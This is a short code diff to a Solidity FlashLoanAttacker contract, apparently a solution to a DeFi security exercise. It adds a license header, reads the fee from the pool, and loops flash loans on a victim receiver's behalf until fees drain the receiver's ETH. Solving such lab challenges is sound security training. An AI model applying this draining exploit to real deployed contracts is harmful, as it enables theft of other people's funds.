@@ -1,3 +1,6 @@
+// SPDX-License-Identifier: Unlicensed
+pragma solidity ^0.8.0;
+
 import "./NaiveReceiverLenderPool.sol";
 import "./FlashLoanReceiver.sol";
 
@@ -17,11 +20,14 @@ contract FlashLoanAttacker {
     }
 
     function executeAttack() public {
-        uint256 fee = 1 ether;
+        uint256 fee = pool.flashFee(ETH, 0);
         uint256 times = address(receiver).balance / fee;
 
-        for (uint256 i = 0; i < times; i++) {
+        for (uint256 i = 0; i < times;) {
             pool.flashLoan(receiver, ETH, 0, "0x");
+            unchecked {
+                ++i;
+            }
         }
     }
 }
